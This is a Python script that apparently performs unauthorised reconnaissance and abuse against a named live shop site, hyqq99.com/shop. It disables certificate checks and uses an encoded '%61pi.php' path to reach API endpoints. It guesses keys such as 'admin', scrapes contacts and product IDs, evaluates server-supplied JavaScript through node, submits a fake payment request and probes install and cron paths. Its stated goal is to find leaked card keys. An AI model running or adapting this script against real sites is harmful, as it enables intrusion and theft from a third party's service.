#!/usr/bin/env python3
"""Fast Rainbow SUCCESS_CASES for hyqq99.com/shop — avoid hanging api.php."""
import re
import json
import ssl
import sys
import subprocess
import urllib.parse
import urllib.request
import urllib.error
import http.cookiejar
from pathlib import Path

OUT = Path("/data/recon/hyqq99.com")
BASE = "https://hyqq99.com/shop"
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
CTX = ssl.create_default_context()
CTX.check_hostname = False
CTX.verify_mode = ssl.CERT_NONE


def log(*a):
    print(*a, flush=True)


def set_cookie(cj, name, value):
    cj.set_cookie(
        http.cookiejar.Cookie(
            0, name, value, None, False, "hyqq99.com", False, False, "/", False,
            False, None, False, None, None, {},
        )
    )


def main():
    cj = http.cookiejar.CookieJar()
    op = urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(cj),
        urllib.request.HTTPSHandler(context=CTX),
    )

    def get(url, data=None, timeout=12):
        h = {
            "User-Agent": UA,
            "Accept": "*/*",
            "Referer": BASE + "/",
            "X-Requested-With": "XMLHttpRequest",
        }
        if data is not None:
            h["Content-Type"] = "application/x-www-form-urlencoded"
        req = urllib.request.Request(url, data=data, headers=h)
        try:
            r = op.open(req, timeout=timeout)
            return getattr(r, "status", 200), r.read()
        except urllib.error.HTTPError as e:
            return e.code, e.read()
        except Exception as e:
            return None, str(e).encode()

    results = {"target": BASE + "/", "cases": {}, "kami_found": False}

    # Use previously saved home if large fetch is slow — try once with 30s
    log("fetch home...")
    code, body = get(BASE + "/", timeout=30)
    # Prefer cached full homepage from earlier probe if current is tiny
    cached = OUT / "probe" / "https_hyqq99.com_shop_.html"
    if (not body or len(body) < 1000) and cached.exists():
        body = cached.read_bytes()
        code = 200
        log("using cached home", len(body))
    home = body.decode("utf-8", "ignore")
    (OUT / "probe" / "home_shop.html").write_text(home, encoding="utf-8")
    results["title"] = (re.search(r"<title>([^<]+)", home) or [None, None])[1]
    results["home_len"] = len(home)
    results["contacts"] = {
        "tg": sorted(set(re.findall(r"t\.me/[\w]+|@hysc\w+|@[A-Za-z][\w]{4,}", home)))[:20]
    }
    log("TITLE", results["title"], "len", len(home), "code", code)

    # getcount
    code, body = get(BASE + "/ajax.php?act=getcount")
    text = body.decode("utf-8", "ignore")
    log("GETCOUNT", code, text)
    results["getcount"] = text
    try:
        results["getcount_json"] = json.loads(text)
    except Exception:
        pass

    # ajax query
    aq = []
    for url in [
        BASE + "/ajax.php?act=query&page=1",
        BASE + "/ajax.php?act=query&page=1&limit=50",
    ]:
        code, body = get(url)
        text = body.decode("utf-8", "ignore")
        log("AJAX", code, text[:200])
        aq.append({"url": url, "code": code, "body": text[:500]})
    code, body = get(
        BASE + "/ajax.php?act=query",
        data=b"page=1&limit=100",
    )
    text = body.decode("utf-8", "ignore")
    log("AJAXPOST", code, text[:200])
    aq.append({"post": True, "code": code, "body": text[:500]})
    results["cases"]["ajax_query"] = aq

    # qd93
    qd = []
    for data in ["1", "test", "12649", "@hysc99"]:
        code, body = get(BASE + f"/?mod=query&data={urllib.parse.quote(data)}", timeout=20)
        text = body.decode("utf-8", "ignore")
        hits = []
        for pat in [r"卡密[^<]{0,80}", r"showOrder", r"mod=faka", r"没有查询到", r"查询结果", r"订单号"]:
            m = re.search(pat, text, re.I)
            if m:
                hits.append(m.group(0)[:80])
        log("QD93", data, hits, "len", len(text))
        qd.append({"data": data, "hits": hits, "len": len(text), "code": code})
        (OUT / "probe" / f"qd93_{data.replace('@','')}.html").write_text(text, encoding="utf-8")
    results["cases"]["qd93"] = qd

    # ONLY %61pi.php — skip api.php (hangs)
    api = []
    for qs in [
        "act=search&id=1",
        "act=search&id=100",
        "act=search&id=1000",
        "act=search&id=12649",
        "act=tools&key=",
        "act=tools&key=123456&limit=1",
        "act=tools&key=hysc99&limit=1",
        "act=tools&key=hyqq99&limit=1",
        "act=tools&key=admin&limit=1",
        "act=site",
        "act=goodslist",
        "act=classlist",
    ]:
        code, body = get(BASE + f"/%61pi.php?{qs}", timeout=15)
        text = body.decode("utf-8", "ignore")
        log("API61", qs, code, text[:200])
        api.append({"qs": qs, "code": code, "body": text[:400]})
    results["cases"]["api61"] = api

    # tids / goods from home
    tids = sorted(set(re.findall(r"[?&]tid=(\d+)", home)))
    cids = sorted(set(re.findall(r"[?&]cid=(\d+)", home)))
    # also data-tid patterns
    tids += sorted(set(re.findall(r"tid[\"'=\s:]+(\d+)", home)))
    tids = sorted(set(tids), key=lambda x: int(x))
    results["tids"] = tids[:100]
    results["cids"] = cids
    log("TIDS", len(tids), tids[:40], "CIDS", cids[:20])

    goods = []
    sample = tids[:6] if tids else ["1", "2", "8", "10", "21"]
    for tid in sample:
        code, body = get(BASE + f"/?mod=buy&tid={tid}", timeout=20)
        text = body.decode("utf-8", "ignore")
        info = {
            "tid": tid,
            "code": code,
            "len": len(text),
            "title": (re.search(r"<title>([^<]+)", text) or [None, None])[1],
            "prices": re.findall(r"([\d]+\.[\d]{2})", text)[:6],
            "stock": (re.search(r"(库存|剩余)[^0-9]{0,12}(\d+)", text) or [None, None, None])[0],
            "hashsalt": "hashsalt" in text,
            "login_required_pay": False,
        }
        goods.append(info)
        log("GOODS", info)
        (OUT / "probe" / f"buy_{tid}.html").write_text(text, encoding="utf-8")
    results["goods"] = goods

    # pay attempt on first tid with hashsalt
    for g in goods:
        if not g.get("hashsalt"):
            continue
        tid = g["tid"]
        code, body = get(BASE + f"/?mod=buy&tid={tid}", timeout=20)
        text = body.decode("utf-8", "ignore")
        hm = re.search(r"var hashsalt=(.+?);", text)
        hashsalt = ""
        if hm:
            hashsalt = subprocess.run(
                ["node", "-e", f"console.log({hm.group(1)})"],
                capture_output=True,
                text=True,
                timeout=10,
            ).stdout.strip()
        payload = urllib.parse.urlencode(
            {"tid": tid, "inputvalue": "13800138000", "num": "1", "hashsalt": hashsalt}
        ).encode()
        code, body = get(BASE + "/ajax.php?act=pay", data=payload, timeout=20)
        text = body.decode("utf-8", "ignore")
        log("PAY", tid, code, text[:300])
        results["pay"] = {"tid": tid, "code": code, "body": text[:400], "hashsalt": bool(hashsalt)}
        break

    # cron / toollogs siblings pattern
    for path in ["/cron.php", "/toollogs.php", "/install/", "/user/login.php"]:
        code, body = get(BASE + path, timeout=10)
        text = body.decode("utf-8", "ignore")
        log("EXTRA", path, code, text[:160].replace("\n", " "))
        results.setdefault("extras", {})[path] = {"code": code, "body": text[:300]}

    blob = json.dumps(results, ensure_ascii=False)
    results["kami_found"] = bool(re.search(r"(卡密|kami)[:：\s\"'][^\"']{6,}", blob, re.I))
    (OUT / "dump" / "STATS.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("KAMI", results["kami_found"])
    log("DONE")


if __name__ == "__main__":
    main()
